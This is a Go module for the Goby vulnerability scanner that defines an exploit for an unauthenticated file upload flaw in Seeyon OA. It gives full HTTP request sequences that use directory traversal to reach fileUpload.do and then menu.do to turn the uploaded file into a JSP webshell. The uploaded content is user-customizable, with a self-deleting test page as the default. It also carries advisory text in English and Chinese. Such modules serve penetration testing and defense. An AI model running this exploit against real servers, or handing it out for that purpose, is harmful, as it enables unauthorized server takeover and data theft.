package exploits

import (
  "git.gobies.org/goby/goscanner/goutils"
)

func init() {
  expJson := `{
    "Name": "Seeyon OA /seeyon/fleUpload.do File Upload Vulnerability",
    "Description": "<p>Seeyon OA is a digital collaborative office software designed to provide enterprises with one-stop big data analysis solutions. The fileUpload.do interface of Seeyon OA contains a file upload vulnerability. Remote attackers without authentication can bypass upload interface restrictions through directory traversal and use the menu.do interface to replace the fileid value of the uploaded file, enabling the upload of a webshell to the server and gaining control over the entire web server.</p>",
    "Product": "SEEYON-OA",
    "Homepage": "https://www.seeyon.com/",
    "DisclosureDate": "2024-12-04",
    "PostTime": "2024-12-04",
    "Author": "wangzhao@baimaohui.net",
    "FofaQuery": "body=\"/seeyon/main/common/js/jquery.qrcode.min.js\" && body=\"登录\"",
    "GobyQuery": "body=\"/seeyon/main/common/js/jquery.qrcode.min.js\" && body=\"登录\"",
    "Level": "3",
    "Impact": "<p>Attackers can upload files containing sensitive information (e.g., database connection strings, API keys) and execute malicious code to fully control the server, leading to server compromise and data breaches.</p>",
    "Recommendation": "<p>1. The storage location of uploaded files should be separated from the server.</p><p>2. Uploaded files should have their filenames and extensions modified.</p><p>3. The upload path should be separated based on business requirements, and downloads should use regenerated filenames.</p><p>4. Monitor and apply the latest patches released by the vendor.<a href=\"https://www.seeyon.com/\">https://www.seeyon.com/</a></p>",
    "References": [
        "https://github.com/wy876/POC/blob/main/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9C%E4%BA%92%E8%81%94-OA%E5%89%8D%E5%8F%B0fileUpload.do%E5%AD%98%E5%9C%A8%E7%BB%95%E8%BF%87%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "Mode",
            "type": "select",
            "value": "Customize",
            "show": ""
        },
        {
            "name": "Content",
            "type": "input",
            "value": "<% out.println(\"test\"); new java.io.File(application.getRealPath(request.getServletPath())).delete();%>",
            "show": "Mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/seeyon/autoinstall.do/../../seeyon/fileUpload.do?method=processUpload",
                "follow_redirect": false,
                "header": {
                    "Accept": "text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2",
                    "Content-Type": "multipart/form-data; boundary=00content0boundary00",
                    "User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)"
                },
                "data_type": "text",
                "data": "--00content0boundary00\r\nContent-Disposition: form-data; name=\"type\"\r\n\r\n\r\n--00content0boundary00\r\nContent-Disposition: form-data; name=\"extensions\"\r\n\r\npng\r\n--00content0boundary00\r\nContent-Disposition: form-data; name=\"applicationCategory\"\r\n\r\n\r\n--00content0boundary00\r\nContent-Disposition: form-data; name=\"destDirectory\"\r\n\r\n\r\n--00content0boundary00\r\nContent-Disposition: form-data; name=\"destFilename\"\r\n\r\n\r\n--00content0boundary00\r\nContent-Disposition: form-data; name=\"maxSize\"\r\n\r\n\r\n--00content0boundary00\r\nContent-Disposition: form-data; name=\"isEncrypt\"\r\n\r\nfalse\r\n--00content0boundary00\r\nContent-Disposition: form-data; name=\"file1\"; filename=\"1.png\"\r\nContent-Type: Content-Type: application/pdf\r\n\r\n{{{CONTENT}}}\r\n--00content0boundary00--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "fileid|lastbody|regex|fileurls=fileurls\\+\",\"\\+'(-?\\d+)'"
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/seeyon/autoinstall.do/../../seeyon/privilege/menu.do",
                "follow_redirect": false,
                "header": {
                    "Accept": "text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2",
                    "Content-type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)"
                },
                "data_type": "text",
                "data": "method=uploadMenuIcon&fileid={{{fileid}}}&filename={{{FILENAME}}}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "FILE_PATH|define|text|/seeyon/main/menuIcon/{{{FILENAME}}}"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.0",
    "Translation": {
        "CN": {
            "Name": "致远OA /seeyon/fleUpload.do 文件上传漏洞",
            "Product": "致远互联-OA",
            "Description": "<p>致远互联-OA 是一款数字化协同办公软件，致力于为企业提供一站式大数据分析解决方案。致远OA 的 fileUpload.do 接口存在文件上传漏洞，未经身份验证的远程攻击者可以通过目录遍历绕过上传接口限制，并利用 menu.do 接口替换上传文件的 fileid 值，将 webshell 上传到服务器，从而获取服务器权限并控制整个 web 服务器。</p>",
            "Recommendation": "<p>1. 上传文件的存储位置应与服务器分离。</p><p>2. 上传的文件应重新修改文件名和文件后缀名。</p><p>3. 文件上传路径应根据业务需求进行分离，下载时根据重新生成的文件名进行下载。</p><p>4. 关注厂商发布的最新修复版本并及时更新。<a href=\"https://www.seeyon.com/\">https://www.seeyon.com/</a></p>",
            "Impact": "<p>攻击者可以上传包含敏感信息的文件（如数据库连接字符串、API 密钥等），并通过上传恶意代码完全控制服务器，导致服务器被攻陷，企业数据面临泄露风险。</p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "Seeyon OA /seeyon/fleUpload.do File Upload Vulnerability",
            "Product": "SEEYON-OA",
            "Description": "<p>Seeyon OA is a digital collaborative office software designed to provide enterprises with one-stop big data analysis solutions. The fileUpload.do interface of Seeyon OA contains a file upload vulnerability. Remote attackers without authentication can bypass upload interface restrictions through directory traversal and use the menu.do interface to replace the fileid value of the uploaded file, enabling the upload of a webshell to the server and gaining control over the entire web server.</p>",
            "Recommendation": "<p>1. The storage location of uploaded files should be separated from the server.</p><p>2. Uploaded files should have their filenames and extensions modified.</p><p>3. The upload path should be separated based on business requirements, and downloads should use regenerated filenames.</p><p>4. Monitor and apply the latest patches released by the vendor.<a href=\"https://www.seeyon.com/\">https://www.seeyon.com/</a></p>",
            "Impact": "<p>Attackers can upload files containing sensitive information (e.g., database connection strings, API keys) and execute malicious code to fully control the server, leading to server compromise and data breaches.</p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "TEMPLATE": "define|variable|FileUpload",
        "SCRIPT_TYPE": "define|variable|jsp",
        "VUL_URL": "define|variable|/seeyon/autoinstall.do/../../seeyon/fileUpload.do"
    },
    "VariablesOrder": [
        "TEMPLATE",
        "SCRIPT_TYPE",
        "VUL_URL"
    ],
    "EditType": "fast",
    "PocId": "9975"
}`
  
    ExpManager.AddExploit(NewExploit(
      goutils.GetFileName(),
      expJson,
      nil,
      nil,
    ))
  }